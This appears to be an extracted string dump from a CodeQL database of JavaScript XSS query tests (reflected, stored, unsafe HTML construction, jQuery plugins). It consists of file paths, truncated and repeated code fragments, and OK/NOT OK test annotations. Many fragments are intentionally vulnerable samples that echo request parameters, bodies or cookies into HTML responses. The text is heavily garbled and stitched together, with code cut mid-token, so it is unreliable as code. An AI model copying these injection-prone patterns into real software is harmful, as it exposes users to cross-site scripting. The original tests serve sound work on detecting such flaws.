ow?)\n\t}{\n\t\tif  ... ow?)\n\t}if (err ... rn;\n\t\t}{\n\t\t\t$( ... rn;\n\t\t}$('myId ... error);$('myId ... (error)$('myId').html(res);$('myId').html(res)(functi ... \t});\n}){\n\tvar  ... \n\t});\n}var foo ... search;foo = d ... .searchnew Pro ... OK\n\t});new Pro ...  OK\n\t})new Pro ... ).catchnew Pro ... solve))resolve ... esolve)unknown ... esolve)(e) =>  ... T OK\n\t}{\n\t\tnull[foo];\n\t}null[foo];null[foo]try {\n\t ... sh. \n\t}{\n\t\tunk ... oo];\n\t}unknown()[foo];unknown()[foo]unknown()catch ( ... sh. \n\t}{\n\t\t$(' ... sh. \n\t}try {\n\t ... / OK\n\t}{\n\t\t"foo"[foo]\n\t}"foo"[foo]catch ( ... / OK\n\t}{\n\t\t$(' ... / OK\n\t}functio ... ve);\n\t}{\n\t\tunk ... ve);\n\t}unknown ... solve);inner(foo, resolve)unknown ... . \n\t});unknown ... n. \n\t})(error, ... wn. \n\t}{\n\t\tif  ... wn. \n\t}if (err ...  OK\n\t\t}{\n\t\t\t$( ...  OK\n\t\t}app.get ... )\n\t}\n})functio ... s)\n\t}\n}{\n\ttry  ... s)\n\t}\n}try {\n\t ... xss)\n\t}{\n\t\tres ... id);\n\t}res.sen ... ms.id);res.sen ... ams.id)catch(e ... xss)\n\t}{\n\t\tres ... xss)\n\t}res.send(err);res.send(err)(functi ... \t\n})();(functi ... \n\t\n})()(functi ... \t}\n\t\n})functio ... \n\t}\n\t\n}{\n\tvar  ... \n\t}\n\t\n}{\n\t\t//  ... oo);\n\t}Object. ... o, foo)_.pick(foo, foo);_.pick(foo, foo)_.pick[foo, f ... (join);[foo, f ... n(join)[foo, foo].join[foo, foo]$.val(foo);$.val(foo)$.valJSON.parse(foo);JSON.parse(foo)/bla/.test(foo);/bla/.test(foo)/bla/.testconsole.log(foo);console.log(foo)log.info(foo);log.info(foo)log.infolocalSt ... m(foo);localSt ... em(foo)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ExceptionXss/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/ReflectedXss.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss BAD: a request parameter is incorporated without validation into the response// BAD: ... esponse TODO: do something exciting// TODO ... xciting OK - no html// OK - no html OK - HTML is sanitized. // OK - ... tized. isValidUserId"Unknown user: "moreBadStuffmarked"marked"'markdown-table''Name''Content''body'showdown'showdown'converterConvertermakeHtmlunified'unified'markdown'remark-parse'remark2rehype'remark-rehype'doc'rehype-document''rehype-format''rehype-stringify'remark"remark""rehype-sanitize"resetExtensions''processSyncsnarkdown'snarkdown'snarkdown2"snarkdown"markdownIt'markdown-it'markdownIt2markdownIt3'markdown-it-highlightjs''markdown-it-sanitizer''markdown-it-abbr'if (!is ...   ;\n  }!isVali ... ams.id)isValid ... ams.id){\n    / ... s);\n  }"Unknow ... rams.idUnknown user: moreBad ... , res);moreBad ... s, res){\n    / ...   ;\n  }{\n  res ... OT OK\n}params.idvar mar ... rked");marked  ... arked")require("marked")res.send(req.body);res.send(req.body)res.sen ... body));res.sen ... .body))marked(req.body)var tab ... table')require ... table')markdown-tablevar myt ... ]\n  ]);mytable ... y]\n  ])table([ ... y]\n  ])[\n    [ ... dy]\n  ]['Name', 'Content']NameContent['body', req.body]res.send(mytable);res.send(mytable)var sho ... down');showdow ... wdown')require('showdown')var con ... rter();convert ... erter()new sho ... erter()showdown.Converterconvert ... q.body)converter.makeHtmlvar uni ... fied');unified ... ified')require('unified')var mar ... arse');markdow ... parse')remark-parsevar rem ... hype');remark2 ... ehype')require ... ehype')remark-rehypevar doc ... ment');doc = r ... ument')require ... ument')rehype-documentvar for ... rmat');format  ... ormat')require ... ormat')rehype-formatvar htm ... gify');html =  ... ngify')require ... ngify')rehype-stringifyvar rem ... mark");remark  ... emark")require("remark")var san ... tize");sanitiz ... itize")require ... itize")rehype-sanitizeconst { ... down');{ reset ... wdown'){ resetExtensions }app.get ...  })\n});app.get ...   })\n}){\n  res ... \n  })\n}unified ...     });unified ... \n    })unified ... processunified ... e(html)unified ...    .useunified ... format)unified ... \udc4b\u1f30d\udf0d' })unified ... rehype)unified ... rkdown)unified()\n    .useunified(){ title: '\u1f44b\udc4b\u1f30d\udf0d' }title: '\u1f44b\udc4b\u1f30d\udf0d''\u1f44b\udc4b\u1f30d\udf0d'res.send(file);res.send(file)res.sen ... ing());res.sen ... ring())remark( ... tring()remark( ... oStringremark( ... q.body)remark().processSyncremark()remark( ... essSyncremark( ... nitize)remark().useres.sen ... tring);res.sen ... String)unified ... oStringunified ... q.body)unified ... essSyncunified().useremark( ... OK\n  })remark().process(e, f)  ...  OK\n  }res.send(f);res.send(f)import  ... kdown';var sna ... down");snarkdo ... kdown")require("snarkdown")snarkdown(req.body)snarkdown2(req.body)const m ... rue\n});markdow ... true\n})require ... true\n})require ... wn-it')markdown-it{\n  html: true\n}html: trueconst m ... ')({});markdow ... t')({})require ... t')({})const m ... tjs'));markdow ... htjs'))require ... htjs'))require ... \n  .userequire ...  true}){html: true}require ... ghtjs')'markdo ... ightjs'markdown-it-highlightjsmarkdow ... q.body)markdownIt.rendermarkdownIt2.rendermarkdownIt3.rendermarkdow ... .rendermarkdow ... izer'))markdownIt.userequire ... tizer')'markdo ... itizer'markdown-it-sanitizermarkdow ... nknown)markdow ... ')).usemarkdow ... abbr'))require ... -abbr')markdown-it-abbr/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/ReflectedXssContentTypes.js OK - content type is plain text// OK - ... in text NOT OK - content type is HTML.// NOT  ... s HTML. OK - content type is JSON// OK - ... is JSON NOT OK - content type is not set.// NOT  ... ot set. OK - content type is still JSON// OK - ... ll JSON'Content-Type'"FOO: "200'application/json'404'text/plain;charset=utf8'textContentType"text/plain"somethingMorewhilemyFancyFunctionfunctio ... .\n  }\n}{\n  if  ... .\n  }\n}if (wha ... ML.\n  }{\n    r ... ext\n  }res.set ... lain');res.set ... plain')res.set"FOO: " ... rams.idFOO: {\n    r ... ML.\n  }res.set ... html');res.set ... /html')if (wha ... et.\n  }{\n    r ... SON\n  }res.wri ... son'});res.wri ... json'})res.writeHead{'Conte ... /json'}'Conten ... n/json'{\n    r ... et.\n  }res.writeHead(404);res.writeHead(404)app.get ... SON\n});app.get ... JSON\n})functio ...  JSON\n}{\n  res ...  JSON\n}if (wha ... SON\n  }{\n  if  ... K\n  }\n}if (err ...  OK\n  }res.sta ...  = 404;res.statusCode = 404res.statusCoderes.end ... ms.id);res.end ... ams.id)res.set ... utf8');res.set ... =utf8')res.setHeader'text/p ... t=utf8'text/plain;charset=utf8functio ... ain";\n}{\n  res ... ain";\n}result  ... plain";result  ... /plain"res.hea ... pe()});res.hea ... ype()})res.header{'Conte ... Type()}'Conten ... tType()textContentType()app.get ... et.\n});app.get ... set.\n})functio ...  set.\n}{\n  if  ...  set.\n}if (err ... rn;\n  }{\n    r ... rn;\n  }doSomething();doSomething()somethingMore();somethingMore()while(M ... m()) {}{\n  res ... // OK\n}myFancy ... K\n  });myFancy ... OK\n  })() => { ...  OK\n  }{\n\tres. ...  OK\n  }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/ReflectedXssGood.js GOOD: request parameter is sanitized before incorporating it into the response// GOOD ... esponse GOOD: templating prevents XSS// GOOD ... nts XSS GOOD: response content type set to text// GOOD ... to text'escape-html'invalidUserIdTemplate'/echo''Content-Length'/["'&<>]/escapeHtml1matchHtmlRegExpescapeHtml2var esc ... html');escape  ... -html')escape-htmlapp.get ...   ;\n});app.get ...    ;\n})functio ...     ;\n}{\n  if  ...     ;\n}if (!is ... g\n    ;res.sen ... s.id));res.sen ... ms.id))"Unknow ... ams.id)escape( ... ams.id)functio ... d });\n}{\n  if  ... d });\n}if (!is ... .id });res.ren ... .id });res.ren ... s.id })invalid ... emplate{ id: r ... ms.id }id: req.params.id{\n    / ... d);\n  }res.set ... ype());res.set ... Type())app.get ... g);\n});app.get ... sg);\n})/echofunctio ... msg);\n}{\n\tvar  ... msg);\n}var msg ... ms.msg;msg = req.params.msgreq.params.msgres.set ... json');res.set ... /json')res.set ... ength);res.set ... length)Content-Lengthmsg.lengthres.end(msg);res.end(msg){\n  con ... K\n  }\n}const u ... ams.id;url = req.params.idif (!/[ ...  OK\n  }!/["'&<>]/.exec(url)/["'&<>]/.exec(url)/["'&<>]/.exec["'&<>]res.send(url);res.send(url)if (!/[ ... tr;\n  }!/["'&<>]/.exec(str)/["'&<>]/.exec(str){\n      ... tr;\n  }return str;{\n  con ... // OK\n}res.sen ... (url));res.sen ... 1(url))escapeHtml1(url)const m ... '&<>]/;matchHt ... "'&<>]/const s ... string;str = '' + string'' + stringconst m ... c(str);match = ... ec(str)matchHt ... ec(str)matchHtmlRegExp.execif (!ma ... ;\n    }!matchres.sen ... 2(url))escapeHtml2(url)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/ReflectedXssGood2.jsrespsendTextResponse"content-type""text/plain; charset=utf-8"const u ... "url");require ... me)\n});require ... ame)\n})functio ... name)\n}{\n  var ... name)\n}var tar ...  true);target  ... , true)sendTex ... thname)target.pathname{\n  res ... ext);\n}resp.wr ... f-8"});resp.wr ... tf-8"})resp.writeHead{"conte ... utf-8"}"conten ... =utf-8"content-type"text/p ... =utf-8"text/plain; charset=utf-8resp.end(text);resp.end(text)resp.end/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/ReflectedXssGood3.js "// " &// & '// ' <// < >// > "&"// "&" "\""// "\"" "<"// "<" ">"// ">" OK - but FP [INCONSISTENCY]34'&quot;'break3839'&#39;'6062+='\"'escapeHtml3XMLCharsAMPQUOTLTGTescapeHtml4chatAtfunctio ... html;\n}{\n  var ... html;\n}var str ... string;str = "" + string"" + stringlet escape;let html = '';html = ''let lastIndex = 0;lastIndex = 0for (le ... pe;\n  }index < str.lengthstr.lengthindex++let index = 0index = 0{\n    s ... pe;\n  }switch  ... ;\n    }str.cha ... (index)str.charCodeAtcase 34 ...  break;escape = '&quot;';escape = '&quot;'&quot;break;case 38 ...  break;escape = '&amp;';escape = '&amp;'case 39 ...  break;escape = '&#39;';escape = '&#39;'&#39;case 60 ...  break;escape = '&lt;';escape = '&lt;'case 62 ...  break;escape = '&gt;';escape = '&gt;'default ... ntinue;continue;if (las ... ;\n    }lastIndex !== indexhtml += ... index);html += ...  index)str.sub ...  index)str.substringlastInd ... ex + 1;lastInd ... dex + 1index + 1html += escape;html += escapereturn  ... : html;lastInd ...  : htmlhtml +  ...  index)functio ...  buf;\n}{\n  var ...  buf;\n}var buf = "";buf = ""while ( ...   }\n  }i < s.lengths.length{\n    v ...   }\n  }var ch = s[i++];ch = s[i++]s[i++]case '& ...  break;buf += '&amp;';buf += '&amp;'case '< ...  break;buf += '&lt;';buf += '&lt;'case '\ ...  break;buf += '&quot;';buf += '&quot;'default ...  break;buf += ch;buf += chreturn buf;functio ... ('');\n}{\n  var ... ('');\n}var XML ... >"\n  };XMLChar ... ">"\n  }{\n    A ... ">"\n  }AMP: 38QUOT: 34LT: 60GT: 62var par ... 0, i)];parts = ... (0, i)][value. ... (0, i)]value.s ... g(0, i)value.substringi < lengthcase XM ...  break;XMLChars.AMPparts.push('&amp;');parts.push('&amp;')parts.pushXMLChars.QUOTparts.p ... uot;');parts.push('&quot;')XMLChars.LTparts.push('&lt;');parts.push('&lt;')XMLChars.GTparts.push('&gt;');parts.push('&gt;')++i;++ivar j = i;j = iwhile ( ... ;\n    }ch = va ... eAt(i);ch = va ... deAt(i)value.charCodeAt(i)value.charCodeAtif (ch  ...       }ch ===  ... hars.GTch ===  ... hars.LTch ===  ... rs.QUOTch === XMLChars.AMPch === XMLChars.QUOTch === XMLChars.LTch === XMLChars.GTi++;if (j < ... ;\n    }j < iparts.p ... j, i));parts.p ... (j, i))value.s ... g(j, i)return  ... in('');parts.join('')var ch  ... t(i++);ch = s.chatAt(i++)s.chatAt(i++)s.chatAtres.sen ... 3(url))escapeHtml3(url)res.sen ... 4(url))escapeHtml4(url)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/cookies.jscookieParser'cookie-parser''/cookie/:name'"Here, have a cookie: "cookiesvar exp ... rser');cookieP ... arser')cookie-parserapp.use ... ser());app.use ... rser())cookieParser()app.get ... ]);\n});app.get ... e]);\n})/cookie/:namefunctio ... me]);\n}{\n  //  ... me]);\n}res.sen ... name]);res.sen ... .name])"Here,  ... s.name]"Here,  ... okie: "Here, have a cookie: req.coo ... s.name]req.cookiesreq.params.name/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/etherpad.jsisVarName'is-var-name'"/some/path""Hello, world!""("")"let isV ... name');isVarNa ... -name')require ... -name')is-var-nameapp.get ... e);\n});app.get ... se);\n})(req, r ... nse);\n}{\n  let ... nse);\n}let res ... orld!";respons ... world!"Hello, world!if(req. ...  + ")";req.que ... .jsonp)req.query.jsonpisVarNa ... .jsonp)respons ...  + ")";respons ... e + ")"req.que ... e + ")"req.que ... esponsereq.que ... p + "("res.send(response);res.send(response)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/formatting.js OK (returns undefined)// OK ( ... efined)'/user/'evil"<div>%s</div>"express ...  OK\n});express ... T OK\n})express().get/user/var evi ... y.evil;evil =  ... ry.evilreq.query.evilres.sen ... evil));res.sen ...  evil))console ... , evil)<div>%s</div>util.fo ... , evil)require ... , evil)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/live-server.jsliveServer"live-server"middleware<html><body></body></html>var liv ... rver");liveSer ... erver")require ... erver")live-serverconst m ...  OK\n}];middlew ... T OK\n}][functi ... T OK\n}]{\n    c ... OT OK\n}const t ... eq.url;tainted = req.urlres.end ... tml>`);res.end ... html>`)`<html> ... /html>`middlew ...  OK\n});middlew ... T OK\n})middleware.pushvar par ... ware\n};params  ... eware\n}{\n    middleware\n}liveSer ... arams);liveSer ... params)liveServer.start/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/package.json{\n  "na ... "\n  }\n}"my-app""0.1.0"0.1.0{\n    " ... rt"\n  }"next dev"next dev"next build"next build"next start"next start{\n    " ... .1"\n  }"^10.0.0"^10.0.0"17.0.1"17.0.1dependencies/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/pages/Next.jsx/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/pagesPostgetInitialPropsctxgetServerSidePropsexport  ... n />;\n}functio ... n />;\n}{\n    r ... n />;\n}return <span />;<span />Post.ge ... rn {}\n}Post.getInitialPropsasync ( ... rn {}\n}{\n    c ... rn {}\n}const req = ctx.req;req = ctx.reqctx.reqconst res = ctx.res;res = ctx.resctx.resres.end(req.url);res.end(req.url)return {}export  ...     }\n}async f ...     }\n}props: {}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/pages/api/myapi.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/pages/apiexport  ... url);\n}functio ... url);\n}{\n    r ... url);\n}res.send(req.url);res.send(req.url)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/partial.js OK - the callback itself is not tainted// OK - ... tainted NOT OK - but not currently detected [INCONSISTENCY] OK - argument is not tainted from this call site// OK - ... ll siteunderscore'underscore''lodash''ramda'sendResponse"/underscore"partial"/lodash""/ramda""/return"getFirst"Hello"let und ... core');undersc ... score')require ... score')let lod ... dash');lodash  ... odash')require('lodash')let R = ... amda');R = require('ramda')require('ramda')ramdaapp.get ... k);\n});app.get ... ck);\n})(req, r ... ack);\n}{\n  fun ... ack);\n}res.send(x + y);res.send(x + y)x + ylet cal ... q.url);callbac ... eq.url)sendRes ... eq.url)sendResponse.bind[1, 2,  ... lback);[1, 2,  ... llback)[1, 2, 3].forEach[1, 2, 3]/underscoreundersc ... eq.url)underscore.partial/lodashlodash. ... eq.url)lodash.partial/ramdalet cal ... .url]);callbac ... q.url])R.parti ... q.url])R.partial[req.url]app.get ... ite\n});app.get ... site\n})/return(req, r ...  site\n}{\n  fun ...  site\n}functio ...  x;\n  }{\n    return x;\n  }getFirs ... eq.url)getFirst.bindres.send(callback);res.send(callback)res.sen ... ack());res.send(callback())callback()res.sen ... llo"));res.sen ... ello"))getFirst("Hello")Hello/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/promises.js{\n  new ... // OK\n}new Pro ... nd(x));new Pro ... end(x))new Pro ...   .thennew Pro ... .data))(resolv ... y.data)resolve ... y.data)req.query.datax => res.send(x)res.send(x)new Pro ... tml(x))x => escapeHtml(x)escapeHtml(x)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/tst2.jsaKnownValue'/bar''clone''/baz'serializeJavaScript'serialize-javascript'serializedfclone'fclone'jc'json-cycle'retrocycledecyclesortKeys'sort-keys'let { p ... params;{ p, q: ... .params{ p, q: r }q: rres.send(p);res.send(p)res.send(r);res.send(r)const a ...  "foo";aKnownValue = "foo"/barif (p = ... end(p);p == aKnownValueif (p ! ... end(p);p != aKnownValueconst c ... lone');clone = ... clone')require('clone')/bazobj.p = p;obj.p = pobj.pvar oth ... e(obj);other = clone(obj)clone(obj)res.send(other.p);res.send(other.p)other.pconst s ... ript');seriali ... cript')require ... cript')'serial ... script'serialize-javascriptvar ser ... ipt(p);seriali ... ript(p)res.sen ... lized);res.send(serialized)var uns ... true});unsafe  ...  true})seriali ...  true}){unsafe: true}unsafe: trueres.send(unsafe);res.send(unsafe)const f ... lone');fclone  ... clone')require('fclone')other = fclone(obj)fclone(obj)const j ... ycle');jc = re ... cycle')require ... cycle')json-cyclevar oth ... (obj));other = ... e(obj))jc.retr ... e(obj))jc.retrocyclejc.decycle(obj)jc.decycleconst s ... keys');sortKey ... -keys')require('sort-keys')sort-keysvar oth ... s(obj);other = ... ys(obj)sortKeys(obj)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ReflectedXss/tst3.js'x-powered-by'regsemi"babel"app.ena ...  OK\n});app.ena ... T OK\n})app.ena ... y').getapp.ena ... ed-by')app.ena ... disableapp.enablex-powered-by{\n  con ... OT OK\n}const c ... el" });code =  ... bel" })prettie ... bel" })reg.body{ semi: ... abel" }semi: falseparser: "babel"babelres.send(code);res.send(code)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/StoredXss/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/StoredXss/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/StoredXss/xss-through-filenames.js
 * The essence of a real world vulnerability.
 "/myDir"files1files2files3'<li>''</li>'dirsThe essence of a real world vulnerability.express ... });\n});express ...  });\n}){\n    f ...   });\n}fs.read ...     });fs.read ... \n    })/myDirres.send(files1);res.send(files1)http.cr ... });\n});http.cr ...  });\n}){\n\n     ...   });\n}var files3 = [];files3 = []files2. ...     });files2. ...      })files2. ... forEachfiles2.sort(sort)files2.sortfiles3. ... /li>');files3. ... </li>')files3.push'<li>'  ... '</li>''<li>' + file<li></li>files3.join('')files3.joinfunctio ... \n\n    }{\n      ... \n\n    }res.write(files1);res.write(files1)var dirs = [];dirs = []var files2 = [];files2 = []files1. ...     });files1. ...      })files1.forEachfiles2.push(file);files2.push(file)files2.pushres.write(files2);res.write(files2)var fil ... iles2);files3  ... files2)format(files2)res.write(files3);res.write(files3)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/StoredXss/xss-through-torrent.jsconst p ... ress');let tor ... t.name;torrent ... nknown)parseTo ... nknown)name = torrent.nametorrent.nameres.send(name);res.send(name)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/jquery-plugin.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstructiondefine'function'amd'jquery''jquery-ui'"<span>""</span>"(functi ... OK\n}));(functi ...  OK\n}))functio ... / OK\n})if (typ ... ry);\n\t}typeof  ... ine.amdtypeof  ... nction'typeof definedefine.amd{\n\t\tdef ... ry);\n\t}define( ... ctory);define( ... actory)['jquer ... ry-ui']jquery-ui{\n\t\tfac ... ry);\n\t}factory(jQuery);factory(jQuery){\n    $ ... // OK\n}$("<spa ... pan>");$("<spa ... span>")"<span> ... /span>""<span> ... ("foo")<span>$.trim("foo")$.trim</span>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/main.js OK - is never added to the DOM.// OK - ... he DOM. not called here, but still bad.// not  ... ll bad.xssThroughHTMLConstruction"#html"xssThroughXMLParsing"text/xml""#xml"xssThroughMoreComplexXMLParsing'span'xssThroughMarkdown"#markdown"striptags'striptags'sanitizedHTML"#sanitized"ts"./typed""./jquery-plugin"plainDOMXMLParsingdoXss"#class"createsClassxssPlugin"name"guardsattrVal"<img alt=\""/"|'/gintentionalTemplatespanTemplate"#template"module. ... html;\n}module. ... ructionxssThro ... ruction{\n    c ... html;\n}const h ... span>";html =  ... /span>""<span>" + sdocumen ... = html;documen ...  = htmldocumen ... #html")documen ... elector#htmlmodule. ... ent);\n}module. ... Parsing{\n    c ... ent);\n}const d ... /xml");doc = n ... t/xml")new DOM ... t/xml")new DOM ... mStringtext/xmldocumen ... ement);documen ... lement)documen ... "#xml")#xmldoc.documentElementmodule. ... tmp);\n}xssThro ... Parsingfunctio ... tmp);\n}{\n    c ... tmp);\n}const x ... lement;xml = d ... Elementconst t ... span');tmp = d ... 'span')documen ... 'span')tmp.app ... ode());tmp.app ... Node())tmp.appendChildxml.cloneNode()xml.cloneNodedocumen ... d(tmp);documen ... ld(tmp)const m ... true});markdow ...  true})module. ... arkdownconst h ... der(s);html =  ... nder(s)markdown.render(s)markdown.renderdocumen ... kdown")#markdownconst s ... tags');stripta ... ptags')require('striptags')module. ... zedHTMLconst h ... pan>");html =  ... span>")stripta ... span>")documen ... tized")#sanitizedmodule. ... yped");module. ... typed")module.exports.tsrequire("./typed")./typed/typedmodule. ... ugin");module. ... lugin")module. ... .jqueryrequire ... lugin")./jquery-plugin/jquery-pluginmodule. ...  DOM.\n}functio ...  DOM.\n}{\n    c ...  DOM.\n}class F ...    }\n\n}constru ... ;\n    }(s) {\n  ... ;\n    }this.step = s;this.step = sthis.stepdoXss() ... K\n    }documen ... span>";documen ... /span>"documen ... class")#class"<span>" + this.stepmodule. ... o(s);\n}module. ... esClassfunctio ... o(s);\n}{\n    r ... o(s);\n}return new Foo(s);new Foo(s)$.fn.xs ...   });\n}$.fn.xssPluginconst d ... \n    };default ... "\n    }{\n      ... "\n    }name: "name"const s ... tions);setting ... ptions)$.exten ... ptions)$.extendreturn  ...     });this.ea ... \n    })$("<b>" ... (this);$("<b>" ... o(this)$("<b>" ... ppendTo"<b>" + ... gs.namesettings.namemodule. ...     }\n}module. ... .guards{\n    d ...     }\n}documen ... "\"/>";documen ...  "\"/>"documen ... ("#id")"<img a ...  "\"/>""<img a ... attrVal<img alt=""<img a ... /g, "")attrVal ... /g, "")attrVal.replace"|'if (att ... K\n    }attrVal ...  === -1attrVal ... f("\"")attrVal.indexOfattrVal.indexOf("'")module. ... emplate"<span> ... emplateobj.spanTemplatedocumen ... plate")#template/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/package.json{\n    " ... n.js"\n}"my-unsafe-library"my-unsafe-library"./main.js"./main.js(s: string) => void(title?: string) => Document(s: string) => string() => void"x"typeof import("mongodb")Collection(query: any) => anytypeof import("mongoose")ModelQuery"express""body-parser"body-parser() => Collection"/find"/find(this: any, key: string, value: any) => any(text: string, reviver?: (this: any, key: strin...(req: any, res: any) => void() => Model() => QueryMyComponent{ location: Location; }(redirectUri: string) => voidtypeof globalThisWindow & typeof globalThisstring | URL(url: string | URL) => voidMyTrackingComponent{ loc: Location; }(loc: any) => void"/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/typed"DocumentAndElementEventHandlersDocumentOrShadowRootFontFaceSourceGlobalEventHandlersNonElementParentNodeXPathEvaluatorBaseARIAMixinAnimatableInnerHTMLSlottableElementContentEditableHTMLOrSVGElementbasicHtmlConstructioninsertIntoCreatedDocumentnotVulnerable"mongodb""mongoose""/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/typed/typedClient"getCollectiongetMongooseModelgetMongooseQuery"/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/typed"__typedoRedirectcomponentDidMountAnimationFrameProviderWindowEventHandlersWindowOrWorkerGlobalScopeglobalThis__objectmyIndirectRedirectmongodbmongoose(s: string): void(title?: string): Document(s: string): string(): void(query: any): any(): any(): mongodb.Collection(this: any, key: string, value: any): any(text: string, reviver?: (this: any, key: string, value: any) => any)...reviver(req: any, res: any): void(): mongoose.Model(): mongoose.Query(redirectUri: string): voidredirectUri(url: string | URL): void(loc: any): void/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/tsconfig.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeHtmlConstruction/typed.ts OK - inserted into document disconnected from the main DOM. [INCONSISTENCY]newDocexport  ... html;\n}basicHt ... ructionexport  ... ENCY]\n}insertI ... ocument{\n    c ... ENCY]\n}const n ... nt("");newDoc  ... ent("")documen ... ent("")documen ... ocumentdocumen ... ntationnewDoc. ... span>";newDoc. ... /span>"newDoc. ... nerHTMLnewDoc.bodyexport  ... rn s;\n}{\n    return s;\n}const s = id("x");s = id("x")id("x")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeJQueryPlugin/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeJQueryPlugin/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/UnsafeJQueryPlugin/unsafe-jquery-plugin.js NOT OK (or is it?)// NOT  ... is it?) OK - but should be flagged by another query// OK - ... r query OK - should be sanitized by `MembershipTestSanitizer` - but still flagged because `AccessPath` can't handle these deeply nested properties [INCONSISTENCY] OK (unlikely to be a html/css prefix confusion)// OK ( ... fusion) OK (unlikely to be a html/css prefix confusion);// OK ( ... usion); OK (unlikely to be a string)// OK ( ... string) NOT OK (can still be a string)// NOT  ... string)my_pluginisElement$element$parentmenu'<div></div>''.my_plugin'"my_plugin"affixtooltipintentional1<div>hello</div>intentional2intentional3unintentional<div class=""></div>DEFAULTSanyPrefix"%PLACEHOLDER%"setupPlugin(functi ... );\n\n});(functi ... });\n\n})functio ... }});\n\n}{\n\t$.fn ... }});\n\n}$.fn.my ... \t}\n\n\t};$.fn.my ... \t\t}\n\n\t}$.fn.my_pluginfunctio ... \t\t}\n\n\t}{\n\t\t$(o ... \t\t}\n\n\t}$(options);$(options)$(options.target);$(options.target)options.targetif (isE ...  OK\n\t\t}isEleme ... target)var tar ... target;target  ... .targetisElement(target)$(target);$(target)if (typ ...  OK\n\t\t}typeof targetif (tar ...  OK\n\t\t}target. ... definedtarget.jquerytypeof target.jqueryif (!ta ...  OK\n\t\t}!target.jqueryif (!!t ...  OK\n\t\t}!!target.jquery$.fn.my ...  OK\n\t};$.fn.my ... T OK\n\t}{\n\t\tthi ... T OK\n\t}this.$e ... ement);this.$e ... lement)this.$element$(element)this.op ... tions);this.op ... ptions)this.optionsif (thi ... parent)this.options.parentthis.$p ... parent)this.$parent$(this. ... parent)$.fn.my ... / OK\n\t}functio ... / OK\n\t}{\n\t\t$(o ... / OK\n\t}$(optio ... r.baz);$(optio ... ar.baz)options.foo.bar.bazoptions.foo.bar$(options.html);$(options.html)options.html{\n\t\t$(x ... T OK\n\t}$(x).ap ... r.baz);$(x).ap ... ar.baz)$(x).appendTo$(x){\n\t\t$(" ... / OK\n\t}$("#" + ... arget);$("#" + ... target)"#" + options.target$.fn.my ... s);\n\t};$.fn.my ... ns);\n\t}functio ... ns);\n\t}{\n\t\tfun ... ns);\n\t}functio ...  OK\n\t\t}{\n\t\t\tth ...  OK\n\t\t}this.o  ... {}, o);this.o  ... ({}, 